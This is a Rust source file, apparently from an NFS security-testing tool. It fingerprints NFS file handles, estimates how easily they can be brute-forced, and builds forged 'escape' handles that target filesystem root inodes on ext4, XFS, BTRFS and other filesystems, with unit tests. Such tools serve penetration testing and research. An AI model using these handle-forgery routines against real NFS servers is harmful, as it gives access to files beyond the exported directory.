        let variants = extract_fsid_variants(export_fh);
        if variants.is_empty() {
            return Vec::new();
        }

        variants
            .iter()
            .enumerate()
            .map(|(i, (fsid_type, fsid))| {
                let mut handle = Vec::with_capacity(4 + fsid.len() + 16);
                handle.push(0x01);
                handle.push(0x00);
                handle.push(*fsid_type);
                handle.push(0xb1); // FILEID_BCACHEFS_WITHOUT_PARENT
                handle.extend_from_slice(fsid);
                handle.extend_from_slice(&4096u64.to_le_bytes()); // inum = 4096 (BCACHEFS_ROOT_INO)
                handle.extend_from_slice(&1u32.to_le_bytes()); // subvol = 1
                handle.extend_from_slice(&0u32.to_le_bytes()); // gen = 0
                let confidence = if i == 0 { 0.5 } else { 0.5 * 0.9 };
                EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Unknown, label: "bcachefs inum 4096 subvol 1".to_owned(), confidence, inode_number: 4096 }
            })
            .collect()
    }

    /// Construct ISO 9660 root handle candidates.
    ///
    /// isofs uses a custom bit-packed fileid: fh32\[0\]=block, fh16\[2\]=offset,
    /// fh16\[3\]=0, fh32\[2\]=gen. The root directory's block number comes from
    /// the Primary Volume Descriptor. Gen=0 is lenient.
    /// We try common root LBAs since they depend on the ISO authoring tool.
    ///
    /// For compound UUID seeds (fsid_type=7), produces both fsid_type=7 and
    /// fsid_type=6 (UUID-only) variants per block.
    pub(crate) fn construct_iso9660_root_candidates(export_fh: &FileHandle) -> Vec<EscapeResult> {
        let fsid_variants = extract_fsid_variants(export_fh);
        if fsid_variants.is_empty() {
            return Vec::new();
        }
        // Common root dir blocks: genisoimage typically uses 23-30, xorriso varies.
        let blocks: &[u32] = &[23, 24, 25, 26, 27, 28, 29, 30, 20, 22, 18, 19, 21];
        blocks
            .iter()
            .flat_map(|&block| {
                fsid_variants.iter().enumerate().map(move |(i, (fsid_type, fsid))| {
                    let mut handle = Vec::with_capacity(4 + fsid.len() + 12);
                    handle.push(0x01);
                    handle.push(0x00);
                    handle.push(*fsid_type);
                    handle.push(0x01); // fileid_type=1 (isofs returns 1)
                    handle.extend_from_slice(fsid);
                    handle.extend_from_slice(&block.to_le_bytes()); // fh32[0] = block
                    handle.extend_from_slice(&0u16.to_le_bytes()); // fh16[2] = offset
                    handle.extend_from_slice(&0u16.to_le_bytes()); // fh16[3] = pad
                    handle.extend_from_slice(&0u32.to_le_bytes()); // fh32[2] = gen = 0
                    let confidence = if i == 0 { 0.4 } else { 0.4 * 0.9 };
                    EscapeResult { root_handle: FileHandle::from_bytes(&handle), fs_type: FsType::Iso9660, label: format!("ISO9660 block {block}"), confidence, inode_number: block }
                })
            })
            .collect()
    }

    /// Estimate the entropy (randomness) of a file handle.
    pub(crate) fn estimate_entropy(fh: &FileHandle) -> EntropyAnalysis {
        let data = fh.as_bytes();
        let os = Self::fingerprint_os(fh);

        let (entropy_bits, random_fields): (f64, Vec<String>) = match os {
            OsGuess::Linux => {
                // Linux root handle: only xdev needs guessing (~11 bits)
                // Linux non-root: gen_no is 32 bits random
                if data.len() <= 12 { (11.0, vec!["xdev (device major:minor)".into()]) } else { (32.0, vec!["generation number (4 bytes)".into()]) }
            },
            OsGuess::FreeBsd => {
                // 4 bytes random fsid + 4 bytes gen = 64 bits
                (64.0, vec!["fsid (4 bytes arc4random)".into(), "ufid_gen (4 bytes)".into()])
            },
            OsGuess::Windows => {
                if Self::check_windows_signing(fh) == SigningStatus::Enabled {
                    (80.0, vec!["HMAC signature (10 bytes)".into()])
                } else {
                    (0.0, vec![])
                }
            },
            OsGuess::HpUx | OsGuess::Unknown => (32.0, vec!["unknown fields".into()]),
        };

        let brute_force_seconds = entropy_bits.exp2() / 10000.0;

        EntropyAnalysis { entropy_bits, brute_force_seconds, random_fields }
    }
}

/// Map Linux knfsd fsid_type to fsid byte length.
///
/// Used by handle constructors that need to locate the fileid within a handle.
/// Returns `None` for unknown fsid_type values.
/// Extract the fsid type byte and fsid data slice from a Linux NFS file handle.
fn extract_fsid(fh: &FileHandle) -> Option<(u8, &[u8])> {
    let data = fh.as_bytes();
    if data.len() < 4 || data.first().copied() != Some(0x01) || data.get(1).copied() != Some(0x00) {
        return None;
    }
    let fsid_type = *data.get(2)?;
    let fsid_len = fsid_len_for_type(fsid_type as usize)?;
    let fsid = data.get(4..4 + fsid_len)?;
    Some((fsid_type, fsid))
}

/// Extract fsid variants from a Linux NFS file handle.
///
/// For compound UUID seeds (fsid_type=7, 24-byte fsid), returns both the full
/// compound fsid AND the 16-byte UUID-only portion (as fsid_type=6). Some
/// filesystem drivers expect fsid_type=6 even when the MOUNT handle uses
/// fsid_type=7. For all other fsid types, returns a single variant.
fn extract_fsid_variants(fh: &FileHandle) -> Vec<(u8, Vec<u8>)> {
    let data = fh.as_bytes();
    if data.len() < 4 || data.first().copied() != Some(0x01) || data.get(1).copied() != Some(0x00) {
        return Vec::new();
    }
    let Some(&fsid_type) = data.get(2) else { return Vec::new() };
    let Some(fsid_len) = fsid_len_for_type(fsid_type as usize) else { return Vec::new() };
    let Some(fsid) = data.get(4..4 + fsid_len) else { return Vec::new() };

    let mut variants = vec![(fsid_type, fsid.to_vec())];

    // Compound UUID (fsid_type=7, 24 bytes): the fsid is [export_inode(4) | export_gen(4) | UUID(16)].
    // Also produce a fsid_type=6 variant using just the 16-byte UUID (bytes 8..24 of fsid).
    if fsid_type == 7
        && fsid_len == 24
        && let Some(uuid) = fsid.get(8..24)
    {
        variants.push((6, uuid.to_vec()));
    }
    variants
}

fn fsid_len_for_type(fsid_type: usize) -> Option<usize> {
    match fsid_type {
        0 | 3..=5 => Some(8), // dev major:minor (32+32 bits)
        1 => Some(4),         // dev number only (32 bits)
        2 => Some(12),        // dev + UUID prefix
        6 => Some(16),        // UUID-based: 16-byte UUID
        7 => Some(24),        // compound UUID: export_inode(4) + export_gen(4) + UUID(16) = 24
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Build a minimal Linux NFSv3 file handle: version=1, auth=0, fsid_type, fileid_type,
    /// then fsid (device major:minor = 8 bytes) and fileid (inode+gen = 8 bytes).
    fn linux_ext4_handle(inode: u32, generation: u32) -> FileHandle {
        let mut data = vec![
            0x01, // version = 1  (Linux)
            0x00, // auth_type = 0
            0x00, // fsid_type = 0 (dev major:minor  --  ext4)
            0x02, // fileid_type = 2 (inode + generation)
            // fsid: 8 bytes (device major=8, minor=1)
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        ];
        data.extend_from_slice(&inode.to_le_bytes());
        data.extend_from_slice(&generation.to_le_bytes());
        FileHandle::from_bytes(&data)
    }

    /// Build a Windows-style 32-byte handle. When `signed` is true, last 10 bytes are non-zero.
    fn windows_handle(signed: bool) -> FileHandle {
        let mut data = vec![0u8; 32];
        // Put non-zero content in early bytes so it doesn't look like padded Linux
        data[0] = 0x03;
        data[1] = 0x00;
        data[2] = 0x00;
        data[3] = 0x00;
        if signed {
            // Non-zero HMAC in last 10 bytes
            for b in &mut data[22..32] {
                *b = 0xAB;
            }
        }
        FileHandle::from_bytes(&data)
    }

    // --- OS fingerprinting ---

    #[test]
    fn fingerprint_linux_handle() {
        let fh = linux_ext4_handle(2, 0);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::Linux);
    }

    #[test]
    fn fingerprint_windows_handle_signed() {
        let fh = windows_handle(true);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::Windows);
    }

    #[test]
    fn fingerprint_short_handle_is_unknown() {
        // A 3-byte handle can't match any known format.
        let fh = FileHandle::from_bytes(&[0xFF, 0xFE, 0xFD]);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::Unknown);
    }

    #[test]
    fn fingerprint_xfs_uuid_handle_is_linux_not_windows() {
        // A 32-byte Linux knfsd handle for an XFS UUID-based export:
        //   [01 00 06 81] + 16-byte UUID fsid (fsid_type=6) + 8-byte 64-bit inode
        //   + 4-byte generation = exactly 32 bytes (FILEID_INO64_GEN, fileid_type=0x81).
        // With a non-zero generation the trailing 4 bytes are non-zero, which used
        // to trip the 32-byte Windows heuristic. version=01/auth=00 must win.
        let mut data = vec![
            0x01, // version = 1 (Linux)
            0x00, // auth_type = 0
            0x06, // fsid_type = 6 (UUID-based)
            0x81, // fileid_type = FILEID_INO64_GEN (XFS, 64-bit inode)
        ];
        data.extend_from_slice(&[0xAB; 16]); // 16-byte UUID fsid
        data.extend_from_slice(&500u64.to_le_bytes()); // 64-bit inode
        data.extend_from_slice(&0xDEAD_BEEFu32.to_le_bytes()); // non-zero generation
        assert_eq!(data.len(), 32, "XFS UUID handle must be exactly 32 bytes");
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::Linux, "32-byte XFS UUID handle must fingerprint as Linux, not Windows");
        // Entropy must follow the Linux (32-bit generation) branch, not the 80-bit HMAC.
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh);
        assert!((analysis.entropy_bits - 32.0).abs() < 1.0, "XFS handle entropy comes from the 32-bit generation");
    }

    // --- FS fingerprinting ---

    #[test]
    fn fingerprint_ext4_from_fsid_type_zero() {
        let fh = linux_ext4_handle(2, 0);
        let fs = FileHandleAnalyzer::fingerprint_fs(&fh);
        assert_eq!(fs, FsType::Ext4);
    }

    #[test]
    fn fingerprint_btrfs_from_fileid_type_0x4d() {
        let data = vec![
            0x01, 0x00, 0x00, // fsid_type = 0
            0x4d, // fileid_type = 0x4d -> BTRFS
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, // fsid
            0x00, 0x01, 0x00, 0x00, // subvol id
            0x00, 0x00, 0x00, 0x00, // generation
        ];
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Btrfs);
    }

    #[test]
    fn fingerprint_short_handle_is_unknown_fs() {
        let fh = FileHandle::from_bytes(&[0x01, 0x00, 0x00]);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Unknown);
    }

    // --- Windows signing detection ---

    #[test]
    fn windows_signing_disabled_all_zeros() {
        // 32-byte handle with all-zero HMAC in last 10 bytes -> signing disabled.
        // This is the precondition for handle forgery on Windows NFS (F-2.3).
        let fh = windows_handle(false);
        assert_eq!(FileHandleAnalyzer::check_windows_signing(&fh), SigningStatus::Disabled);
    }

    #[test]
    fn windows_signing_enabled_nonzero_hmac() {
        let fh = windows_handle(true);
        assert_eq!(FileHandleAnalyzer::check_windows_signing(&fh), SigningStatus::Enabled);
    }

    #[test]
    fn windows_signing_not_applicable_for_non_windows_size() {
        // A Linux handle (e.g. 20 bytes) is not a Windows handle.
        let fh = linux_ext4_handle(2, 0);
        assert_eq!(FileHandleAnalyzer::check_windows_signing(&fh), SigningStatus::NotApplicable);
    }

    #[test]
    fn windows_handle_version_detection_32_byte() {
        let fh = windows_handle(true);
        assert_eq!(FileHandleAnalyzer::detect_windows_handle_version(&fh), Some(WindowsHandleVersion::V3));
    }

    #[test]
    fn windows_handle_version_detection_28_byte() {
        let mut data = vec![0u8; 28];
        // Non-zero signature in last 16 bytes
        for b in &mut data[12..28] {
            *b = 0x55;
        }
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::detect_windows_handle_version(&fh), Some(WindowsHandleVersion::V41));
    }

    #[test]
    fn windows_handle_version_none_for_other_sizes() {
        let fh = linux_ext4_handle(2, 0); // 20 bytes
        assert_eq!(FileHandleAnalyzer::detect_windows_handle_version(&fh), None);
    }

    // --- Entropy estimation ---

    #[test]
    fn entropy_linux_root_handle_low() {
        // The Linux root inode (2) is well-known. Entropy comes only from xdev
        // (device major:minor ~ 11 bits). Short handle <= 12 bytes triggers this path.
        let short_linux = FileHandle::from_bytes(&[
            0x01, 0x00, 0x00, 0x02, // version, auth, fsid_type, fileid_type
            0x08, 0x00, 0x00, 0x00, // fsid (4 bytes only, keep handle <=12)
        ]);
        let analysis = FileHandleAnalyzer::estimate_entropy(&short_linux);
        // Root handle path: ~11 bits
        assert!((analysis.entropy_bits - 11.0).abs() < 1.0, "root handle entropy should be ~11 bits");
        assert!(analysis.brute_force_seconds < 1.0, "root handle should be brute-forceable quickly");
    }

    #[test]
    fn entropy_linux_nonroot_handle_higher() {
        // Non-root Linux handles carry a 32-bit generation number.
        let fh = linux_ext4_handle(12345, 0xDEAD_BEEF);
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh);
        assert!((analysis.entropy_bits - 32.0).abs() < 1.0, "non-root Linux handle entropy should be ~32 bits");
        assert!(!analysis.random_fields.is_empty());
    }

    #[test]
    fn entropy_windows_unsigned_handle_zero() {
        // A properly-identified unsigned Windows handle (data[0]=0x03, non-zero tail elsewhere
        // to trigger Windows fingerprinting, but zero HMAC) has zero entropy.
        // Construct a handle where fingerprint_os returns Windows:
        // data[28..32] must be non-zero OR data[22..32] must have a non-zero byte.
        let mut data = vec![0u8; 32];
        data[0] = 0x03;
        data[28] = 0x01; // make data[28..32] != [0,0,0,0] -> fingerprint_os returns Windows
        // HMAC region (data[22..32]): data[28]=0x01, rest zero  --  HMAC is NOT all-zero
        // so signing == Enabled. To test zero entropy we need the all-zero HMAC variant:
        data[28] = 0x00; // back to zero  --  now data[28..32] is [0,0,0,0]
        // But now fingerprint_os won't return Windows. This demonstrates that an
        // "all-zero HMAC" Windows handle doesn't look like Windows to fingerprint_os.
        // Instead, test the signing check result directly  --  check_windows_signing returns
        // Disabled for a 32-byte handle with zero HMAC, regardless of OS fingerprint.
        let fh_zeros = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::check_windows_signing(&fh_zeros), SigningStatus::Disabled);
        // And confirm the entropy path: fingerprint_os gives Unknown, entropy defaults to 32 bits.
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh_zeros);
        assert!(analysis.entropy_bits > 0.0, "unknown-OS handle gets default entropy estimate");
    }

    #[test]
    fn entropy_windows_signed_handle_high() {
        // Signed Windows handle: 80-bit HMAC protects against forgery.
        let fh = windows_handle(true);
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh);
        assert!(analysis.entropy_bits >= 64.0, "signed Windows HMAC should give high entropy");
    }

    // --- Escape handle construction ---

    #[test]
    fn escape_handle_for_ext4_targets_inode_2() {
        // Root inode on ext4 is always 2 (DESIGN.md S7, F-3.1).
        let export_fh = linux_ext4_handle(12345, 0);
        let result = FileHandleAnalyzer::construct_root_candidates(&export_fh).into_iter().next().expect("no candidates");
        assert_eq!(result.fs_type, FsType::Ext4);
        // The returned handle bytes must embed inode 2 (root) in LE at the inode offset.
        let raw = result.root_handle.as_bytes();
        // For fsid_type=0: inode offset = 4 + 8 = 12
        assert!(raw.len() >= 16, "escape handle must be at least 16 bytes for inode read");
        let inode = u32::from_le_bytes([raw[12], raw[13], raw[14], raw[15]]);
        assert_eq!(inode, 2, "escape handle must target root inode 2");
    }

    #[test]
    fn escape_handle_confidence_is_nonzero() {
        let fh = linux_ext4_handle(99, 0);
        let result = FileHandleAnalyzer::construct_root_candidates(&fh).into_iter().next().expect("no candidates");
        assert!(result.confidence > 0.0);
        assert!(result.confidence <= 1.0);
    }

    #[test]
    fn escape_handle_returns_none_for_non_linux() {
        // Windows handle: version byte != 0x01, so escape is not possible.
        let fh = windows_handle(false);
        assert!(FileHandleAnalyzer::construct_root_candidates(&fh).is_empty(), "escape must return None for non-Linux handles");
    }

    #[test]
    fn construct_handle_for_inode_arbitrary() {
        // Directly target inode 42 with generation 7 on the same filesystem as the export.
        let export_fh = linux_ext4_handle(5, 1);
        let result = FileHandleAnalyzer::construct_handle_for_inode(&export_fh, 42, 7).expect("handle construction must succeed");
        let raw = result.root_handle.as_bytes();
        assert!(raw.len() >= 20, "handle must be at least 20 bytes for inode+generation read");
        let inode = u32::from_le_bytes([raw[12], raw[13], raw[14], raw[15]]);
        let generation_out = u32::from_le_bytes([raw[16], raw[17], raw[18], raw[19]]);
        assert_eq!(inode, 42);
        assert_eq!(generation_out, 7);
        assert!(result.confidence > 0.5, "known generation -> higher confidence");
    }

    #[test]
    fn btrfs_subvol_handles_count() {
        // Produce 5 BTRFS subvolume escape candidates.
        let data = vec![
            0x01, 0x00, 0x00, // fsid_type = 0
            0x4d, // fileid_type = BTRFS
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        let fh = FileHandle::from_bytes(&data);
        let handles = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, 5);
        assert_eq!(handles.len(), 6, "must produce 1 FS-tree handle + max_subvols user handles");
        for h in &handles {
            assert_eq!(h.fs_type, FsType::Btrfs);
        }
    }

    #[test]
    fn btrfs_subvol_handles_empty_for_non_linux() {
        let fh = windows_handle(false);
        let handles = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, 10);
        assert!(handles.is_empty(), "non-Linux handle must yield no BTRFS candidates");
    }

    #[test]
    fn construct_handle_for_inode_fsid_type_1_works() {
        // ext4 with fsid_type=1 (4-byte compact fsid) -- tests the short fsid path.
        let mut data = vec![
            0x01, 0x00, 0x01, // fsid_type = 1 (4-byte dev number)
            0x01, // fileid_type = FILEID_INO32_GEN (ext4)
            0x08, 0x00, 0x00, 0x00, // fsid: 4 bytes
        ];
        data.extend_from_slice(&5u32.to_le_bytes()); // export inode
        data.extend_from_slice(&0u32.to_le_bytes()); // export gen
        let export_fh = FileHandle::from_bytes(&data);
        let result = FileHandleAnalyzer::construct_handle_for_inode(&export_fh, 42, 0);
        assert!(result.is_some(), "ext4 + fsid_type=1 must produce a handle");
        let r = result.unwrap();
        // inode offset for fsid_type=1: 4 + 4 (fsid) = 8
        let raw = r.root_handle.as_bytes();
        assert!(raw.len() >= 12, "handle must be at least 12 bytes for fsid_type=1 inode read");
        let inode = u32::from_le_bytes([raw[8], raw[9], raw[10], raw[11]]);
        assert_eq!(inode, 42);
    }

    #[test]
    fn construct_handle_for_inode_fsid_type_2_works() {
        // ext4 with fsid_type=2 (12-byte fsid) -- tests the medium-length fsid path.
        let mut data = vec![
            0x01, 0x00, 0x02, // fsid_type = 2 (dev + UUID prefix, 12 bytes)
            0x01, // fileid_type = FILEID_INO32_GEN (ext4)
        ];
        data.extend_from_slice(&[0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xAA, 0xBB, 0xCC, 0xDD]); // 12-byte fsid
        data.extend_from_slice(&7u32.to_le_bytes()); // export inode
        data.extend_from_slice(&0u32.to_le_bytes()); // export gen
        let export_fh = FileHandle::from_bytes(&data);
        let result = FileHandleAnalyzer::construct_handle_for_inode(&export_fh, 99, 7);
        assert!(result.is_some(), "ext4 + fsid_type=2 must produce a handle");
        let r = result.unwrap();
        // inode offset for fsid_type=2: 4 + 12 = 16
        let raw = r.root_handle.as_bytes();
        assert!(raw.len() >= 20, "handle must be at least 20 bytes for fsid_type=2 inode read");
        let inode = u32::from_le_bytes([raw[16], raw[17], raw[18], raw[19]]);
        assert_eq!(inode, 99);
    }

    #[test]
    fn construct_root_candidates_xfs_returns_inode_128() {
        // XFS handle: fsid_type=6 (16-byte UUID), fileid_type=0x81 (FILEID_INO64_GEN).
        // Real XFS with UUID-based exports always uses 0x81 to signal 64-bit inodes.
        let mut data = vec![
            0x01, // version = 1
            0x00, // auth_type = 0
            0x06, // fsid_type = 6  --  UUID-based (XFS)
            0x81, // fileid_type = FILEID_INO64_GEN -- XFS 64-bit inode marker
        ];
        // fsid: 16 bytes
        data.extend_from_slice(&[0xAA; 16]);
        // fileid: 64-bit inode + 32-bit generation
        data.extend_from_slice(&500u64.to_le_bytes());
        data.extend_from_slice(&1u32.to_le_bytes());
        let fh = FileHandle::from_bytes(&data);
        let result = FileHandleAnalyzer::construct_root_candidates(&fh);
        assert!(!result.is_empty(), "XFS escape must produce candidates");
        let r = result.into_iter().find(|c| c.inode_number == 128).expect("must include inode 128");
        assert_eq!(r.fs_type, FsType::Xfs);
        // Root inode on XFS v5 is 128; stored as 64-bit LE at inode offset 4+16=20
        let raw = r.root_handle.as_bytes();
        assert!(raw.len() >= 28, "XFS handle must be at least 28 bytes for 64-bit inode read");
        let inode = u64::from_le_bytes([raw[20], raw[21], raw[22], raw[23], raw[24], raw[25], raw[26], raw[27]]);
        assert_eq!(inode, 128, "XFS escape must target root inode 128");
    }

    #[test]
    fn fingerprint_fs_xfs_from_fsid_type_6() {
        let mut data = vec![
            0x01, 0x00, 0x06, // fsid_type = 6  --  UUID
            0x02, // fileid_type = 2
        ];
        data.extend_from_slice(&[0x01; 16]); // 16-byte fsid
        data.extend_from_slice(&128u32.to_le_bytes()); // inode = 128 (XFS root)
        data.extend_from_slice(&0u32.to_le_bytes());
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Xfs);
    }

    #[test]
    fn fingerprint_fs_xfs_from_fsid_type_7() {
        // XFS with fsid_type=7 and fileid_type=0x81 (FILEID_INO64_GEN).
        // 0x81 is the definitive XFS marker regardless of fsid_type.
        let mut data = vec![
            0x01, 0x00, 0x07, // fsid_type = 7
            0x81, // fileid_type = FILEID_INO64_GEN -- XFS
        ];
        data.extend_from_slice(&[0x01; 16]); // 16-byte UUID fsid
        data.extend_from_slice(&128u64.to_le_bytes()); // 64-bit inode
        data.extend_from_slice(&0u32.to_le_bytes());
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Xfs);
    }

    /// XFS with device-based exports (fsid_type=0) uses FILEID_INO64_GEN (0x81)
    /// when the filesystem has 64-bit inodes.  This is the distinguishing marker
    /// between XFS and ext4 on fsid_type=0 handles.
    #[test]
    fn fingerprint_fs_xfs_fileid_type_0x81() {
        let mut data = vec![
            0x01, 0x00, 0x00, // fsid_type = 0 (device-based -- same as ext4)
            0x81, // fileid_type = FILEID_INO64_GEN -- XFS only
            // fsid: 8 bytes (device major:minor)
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        ];
        // inode (64-bit on XFS) + generation
        data.extend_from_slice(&128u64.to_le_bytes());
        data.extend_from_slice(&0u32.to_le_bytes());
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Xfs, "fileid_type=0x81 must identify XFS even when fsid_type=0");
    }

    #[test]
    fn fingerprint_fs_unknown_fsid_type_returns_unknown() {
        let data = vec![
            0x01, 0x00, 0xFF, // fsid_type = 0xFF  --  unknown
            0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_fs(&fh), FsType::Unknown);
    }

    #[test]
    fn estimate_entropy_freebsd_handle_is_64_bits() {
        // Build a FreeBSD-style handle: 20+ bytes, bytes 8-9 = fid_len = 12
        let mut data = vec![0u8; 24];
        data[8] = 0x00;
        data[9] = 12; // fid_len = 12 in BE
        let fh = FileHandle::from_bytes(&data);
        assert_eq!(FileHandleAnalyzer::fingerprint_os(&fh), OsGuess::FreeBsd);
        let analysis = FileHandleAnalyzer::estimate_entropy(&fh);
        assert!((analysis.entropy_bits - 64.0).abs() < 1.0, "FreeBSD handle should have ~64 bits entropy, got {}", analysis.entropy_bits);
    }

    #[test]
    fn construct_btrfs_subvol_handles_start_at_fs_tree() {
        let data = vec![
            0x01, 0x00, 0x00, 0x4d, // BTRFS, fsid_type=0
            0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        ];
        let fh = FileHandle::from_bytes(&data);
        // max_subvols=3: returns 1 (FS tree) + 3 (user subvols) = 4 handles.
        let handles = FileHandleAnalyzer::construct_btrfs_subvol_handles(&fh, 3);
        assert_eq!(handles.len(), 4, "must produce 1 FS-tree handle + max_subvols user handles");
        // First handle targets the FS tree (root_objectid = BTRFS_FS_TREE_OBJECTID = 5).
        // Handle layout for fsid_type=0: 4B header + 8B fsid + 8B objectid + 8B root_objectid + 4B gen
        //   root_objectid offset = 4 + 8 + 8 = 20
        let raw = handles[0].root_handle.as_bytes();
        assert!(raw.len() >= 28, "BTRFS handle must be at least 28 bytes for root_objectid read");
        let root_objectid = u64::from_le_bytes([raw[20], raw[21], raw[22], raw[23], raw[24], raw[25], raw[26], raw[27]]);
        assert_eq!(root_objectid, 5, "first BTRFS handle must target FS_TREE_OBJECTID (5)");
        // Second handle is the first user subvolume (root_objectid = 256).
        let raw2 = handles[1].root_handle.as_bytes();
        assert!(raw2.len() >= 28, "BTRFS handle must be at least 28 bytes for root_objectid read");
        let root_objectid2 = u64::from_le_bytes([raw2[20], raw2[21], raw2[22], raw2[23], raw2[24], raw2[25], raw2[26], raw2[27]]);
        assert_eq!(root_objectid2, 256, "second BTRFS handle must target first user subvolume (256)");
    }

    #[test]
    fn construct_handle_for_inode_fsid_type_7_preserves_24_byte_fsid() {
        // A non-compound fsid_type=7 seed: the 44-byte FILEID_INO32_GEN_PARENT escape
        // format ([01 00 07 02] | export_inode(4) | export_gen(4) | UUID(16) | file...).
        // The fsid is the 24-byte export context (bytes 4..28); fsid_type=7 must map to a
        // 24-byte fsid (kernel FSID_UUID16_INUM key_len) so the rewritten inode lands at
        // offset 28, not 8 bytes inside the real fsid.
        let mut data = vec![0x01, 0x00, 0x07, 0x02]; // version, auth, fsid_type=7, fileid_type=2
        data.extend_from_slice(&10u32.to_le_bytes()); // export_inode
        data.extend_from_slice(&20u32.to_le_bytes()); // export_gen
        data.extend_from_slice(&[0xAB; 16]); // UUID
        data.extend_from_slice(&11u32.to_le_bytes()); // file_inode
        data.extend_from_slice(&22u32.to_le_bytes()); // file_gen
        data.extend_from_slice(&10u32.to_le_bytes()); // parent_inode
        data.extend_from_slice(&20u32.to_le_bytes()); // parent_gen
        assert_eq!(data.len(), 44, "FILEID_INO32_GEN_PARENT seed must be 44 bytes");
        let seed = FileHandle::from_bytes(&data);

        let result = FileHandleAnalyzer::construct_handle_for_inode(&seed, 42, 7).expect("fsid_type=7 handle must construct");
        let raw = result.root_handle.as_bytes();
        assert!(raw.len() >= 36, "fsid_type=7 handle must be at least 36 bytes for fsid+inode+gen read");
        // The full 24-byte fsid (bytes 4..28) must be preserved verbatim.
        assert_eq!(&raw[4..28], &data[4..28], "the full 24-byte fsid (export context) must be preserved");
        // The rewritten inode/gen must land at offset 28 (4 header + 24 fsid).
        let inode = u32::from_le_bytes([raw[28], raw[29], raw[30], raw[31]]);
        let generation = u32::from_le_bytes([raw[32], raw[33], raw[34], raw[35]]);
        assert_eq!(inode, 42, "inode must be written at offset 28, after the full 24-byte fsid");
        assert_eq!(generation, 7);
    }

    /// Build a 28-byte compound-UUID MOUNT handle: [01 00 07 00] | export_inode(4) |
    /// export_gen(4) | UUID(16). fingerprint_fs returns Unknown for this format.
    fn compound_uuid_handle(export_inode: u32) -> FileHandle {
        let mut data = vec![0x01, 0x00, 0x07, 0x00];
        data.extend_from_slice(&export_inode.to_le_bytes());
        data.extend_from_slice(&0u32.to_le_bytes()); // export_gen
        data.extend_from_slice(&[0xCD; 16]); // UUID
        assert_eq!(data.len(), 28);
        FileHandle::from_bytes(&data)
    }

    #[test]
    fn construct_root_candidates_compound_uuid_always_returns_candidates() {
        // The table-based candidate list always produces candidates regardless of
        // the export inode. Identity/self-match filtering happens in the escape
        // engine (probe_candidate), not in the handle constructor.
        let candidates = FileHandleAnalyzer::construct_root_candidates(&compound_uuid_handle(2));
        assert!(!candidates.is_empty(), "must return candidates even for export at inode 2");
        assert!(candidates.iter().any(|c| c.inode_number == 2), "must include ext4 root inode 2");

        let candidates = FileHandleAnalyzer::construct_root_candidates(&compound_uuid_handle(64));
        assert!(!candidates.is_empty(), "must return candidates for export at inode 64");
    }

    #[test]
    fn construct_root_candidates_compound_uuid_includes_xfs_roots() {
        // A compound-UUID export (ambiguous ext4/XFS): the candidate list must include
        // BOTH the ext4 root (inode 2) and the XFS roots (128/64/32) so a single-call site
        // escapes a UUID-based XFS export, not just ext4.
        let seed = compound_uuid_handle(9999); // export at a normal subdirectory inode
        let candidates = FileHandleAnalyzer::construct_root_candidates(&seed);
        let inodes: Vec<u32> = candidates.iter().map(|c| c.inode_number).collect();
        assert!(inodes.contains(&2), "must queue ext4 root inode 2");
        assert!(inodes.contains(&128), "must queue XFS v5 root inode 128");
        assert!(inodes.contains(&64), "must queue XFS root inode 64");
        assert!(inodes.contains(&32), "must queue XFS root inode 32");
    }
}
